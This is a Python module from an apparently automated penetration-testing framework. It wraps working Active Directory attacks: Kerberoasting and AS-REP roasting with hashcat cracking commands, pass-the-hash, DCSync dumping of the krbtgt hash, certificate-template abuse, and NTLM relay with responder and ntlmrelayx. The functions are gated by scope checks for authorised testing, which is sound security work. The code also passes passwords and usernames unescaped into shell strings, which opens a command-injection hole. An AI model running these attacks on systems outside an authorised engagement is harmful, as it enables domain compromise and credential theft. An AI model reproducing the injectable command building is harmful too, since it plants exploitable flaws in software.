"""Active Directory testing tools."""

from __future__ import annotations

from kambo.docker_runner import get_runner
from kambo.models import Phase
from kambo.scope import pentest_only, validate_scope


@pentest_only
async def ad_bloodhound(
    target: str,
    domain: str,
    username: str,
    password: str,
    collection: str = "All",
) -> dict:
    """Run BloodHound collection for AD attack path analysis.

    Args:
        target: Domain Controller IP
        domain: AD domain name
        username: Valid domain user
        password: User's password
        collection: Collection method (All, Group, LocalAdmin, Session, etc.)
    """
    validate_scope(target)
    runner = get_runner()

    cmd = f"bloodhound-python -d {domain} -u {username} -p '{password}' -c {collection} -ns {target} --zip -o /output/ 2>/dev/null"
    result = await runner.run(cmd, "ad_bloodhound", target, Phase.POST_EXPLOITATION, timeout=300)

    return {
        "target": target,
        "domain": domain,
        "collection": collection,
        "output": result.raw_output,
        "note": "BloodHound data saved to /output/. Import into BloodHound GUI for path analysis.",
    }


@pentest_only
async def ad_kerberoast(
    target: str,
    domain: str,
    username: str,
    password: str,
) -> dict:
    """Kerberoasting — extract TGS hashes for offline cracking.

    Args:
        target: Domain Controller IP
        domain: AD domain
        username: Valid domain user
        password: User's password
    """
    validate_scope(target)
    runner = get_runner()

    cmd = f"GetUserSPNs.py {domain}/{username}:'{password}' -dc-ip {target} -request -outputfile /output/kerberoast.txt 2>/dev/null"
    result = await runner.run(cmd, "ad_kerberoast", target, Phase.POST_EXPLOITATION, timeout=60)

    hashes = [l for l in result.raw_output.splitlines() if l.startswith("$krb5tgs$")]

    return {
        "target": target,
        "domain": domain,
        "hashes_found": len(hashes),
        "hashes": hashes,
        "crack_command": "hashcat -m 13100 /output/kerberoast.txt /wordlists/rockyou.txt",
    }


@pentest_only
async def ad_asrep_roast(
    target: str,
    domain: str,
    users_file: str = "",
    users: list[str] | None = None,
) -> dict:
    """AS-REP Roasting — target accounts without pre-authentication.

    Args:
        target: Domain Controller IP
        domain: AD domain
        users_file: Path to users list file
        users: List of usernames to test
    """
    validate_scope(target)
    runner = get_runner()

    if users and not users_file:
        user_list = "\\n".join(users)
        cmd_prefix = f"echo -e '{user_list}' > /tmp/asrep_users.txt && "
        users_file = "/tmp/asrep_users.txt"
    else:
        cmd_prefix = ""
        users_file = users_file or "/tmp/users.txt"

    cmd = f"{cmd_prefix}GetNPUsers.py {domain}/ -dc-ip {target} -usersfile {users_file} -format hashcat -outputfile /output/asrep.txt 2>/dev/null"
    result = await runner.run(cmd, "ad_asrep_roast", target, Phase.POST_EXPLOITATION, timeout=60)

    hashes = [l for l in result.raw_output.splitlines() if l.startswith("$krb5asrep$")]

    return {
        "target": target,
        "domain": domain,
        "hashes_found": len(hashes),
        "hashes": hashes,
        "crack_command": "hashcat -m 18200 /output/asrep.txt /wordlists/rockyou.txt",
    }


@pentest_only
async def ad_pass_the_hash(
    target: str,
    username: str,
    ntlm_hash: str,
    domain: str = "",
) -> dict:
    """Pass-the-Hash attack using NTLM hash.

    Args:
        target: Target host IP
        username: Username
        ntlm_hash: NTLM hash (32 hex chars)
        domain: Domain name (optional)
    """
    validate_scope(target)
    runner = get_runner()

    user_spec = f"{domain}/{username}" if domain else username
    cmd = f"crackmapexec smb {target} -u {username} -H {ntlm_hash} -d {domain or '.'} 2>/dev/null"
    result = await runner.run(cmd, "ad_pass_the_hash", target, Phase.POST_EXPLOITATION, timeout=30)

    success = "Pwn3d" in result.raw_output or "(Pwn3d!)" in result.raw_output

    return {
        "target": target,
        "username": username,
        "success": success,
        "admin_access": success,
        "output": result.raw_output,
    }


@pentest_only
async def ad_dcsync(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    ntlm_hash: str = "",
    target_user: str = "krbtgt",
) -> dict:
    """DCSync attack to replicate credentials from Domain Controller.

    Args:
        target: Domain Controller IP
        domain: AD domain
        username: User with replication rights
        password: Password
        ntlm_hash: NTLM hash (alternative to password)
        target_user: Specific user to dump (default: krbtgt)
    """
    validate_scope(target)
    runner = get_runner()

    if ntlm_hash:
        auth = f"-hashes :{ntlm_hash}"
    else:
        auth = f"'{password}'"

    cmd = f"secretsdump.py {domain}/{username}:{auth}@{target} -just-dc-user {target_user} 2>/dev/null"
    result = await runner.run(cmd, "ad_dcsync", target, Phase.POST_EXPLOITATION, timeout=60)

    return {
        "target": target,
        "domain": domain,
        "target_user": target_user,
        "output": result.raw_output,
        "success": ":::" in result.raw_output,  # hash format user:id:lm:ntlm:::
    }


@pentest_only
async def ad_certify(
    target: str,
    domain: str,
    username: str,
    password: str,
) -> dict:
    """AD CS enumeration and exploitation (ESC1-ESC8).

    Args:
        target: Domain Controller or CA server IP
        domain: AD domain
        username: Valid domain user
        password: Password
    """
    validate_scope(target)
    runner = get_runner()

    # Enumerate vulnerable templates
    cmd = f"certipy find -u {username}@{domain} -p '{password}' -dc-ip {target} -vulnerable -stdout 2>/dev/null | head -100"
    result = await runner.run(cmd, "ad_certify", target, Phase.POST_EXPLOITATION, timeout=60)

    vulnerable = "ESC" in result.raw_output

    return {
        "target": target,
        "domain": domain,
        "vulnerable_templates": vulnerable,
        "output": result.raw_output,
    }


@pentest_only
async def ad_ntlm_relay(
    target: str,
    relay_target: str = "",
    method: str = "smb",
) -> dict:
    """NTLM Relay attack setup guidance.

    Args:
        target: Target for scope validation
        relay_target: Where to relay captured hashes
        method: Relay method — smb, ldap, http
    """
    validate_scope(target)

    # This tool provides setup commands rather than executing the full attack
    # (which requires interactive listeners)
    commands = {
        "responder": f"responder -I eth0 -dwP 2>/dev/null",
        "ntlmrelayx_smb": f"ntlmrelayx.py -t {relay_target or target} -smb2support 2>/dev/null",
        "ntlmrelayx_ldap": f"ntlmrelayx.py -t ldap://{relay_target or target} --escalate-user <user> 2>/dev/null",
    }

    return {
        "target": target,
        "relay_target": relay_target or target,
        "method": method,
        "setup_commands": commands,
        "note": "NTLM relay requires interactive listeners. Execute these commands manually in the container.",
    }
